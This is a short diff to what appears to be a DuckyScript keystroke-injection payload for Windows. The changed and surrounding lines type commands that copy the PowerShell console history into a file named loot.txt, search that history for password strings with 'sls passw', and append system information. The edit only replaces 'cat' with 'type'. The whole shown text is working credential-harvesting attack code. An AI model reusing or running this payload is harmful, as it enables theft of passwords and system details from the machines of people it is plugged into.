@@ -37,9 +37,9 @@ STRINGLN type C:\Users\%userprofile%\AppData\Roaming\Microsoft\Windows\PowerShel
 DELAY 500
 STRINGLN type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt >> loot.txt
 DELAY 500
-STRINGLN cat (Get-PSReadlineOption).HistorySavePath >> loot.txt
+STRINGLN type (Get-PSReadlineOption).HistorySavePath >> loot.txt
 DELAY 500
-STRINGLN cat (Get-PSReadlineOption).HistorySavePath | sls passw >> loot.txt
+STRINGLN type (Get-PSReadlineOption).HistorySavePath | sls passw >> loot.txt
 DELAY 500
 STRINGLN systeminfo >> loot.txt
 DELAY 1000
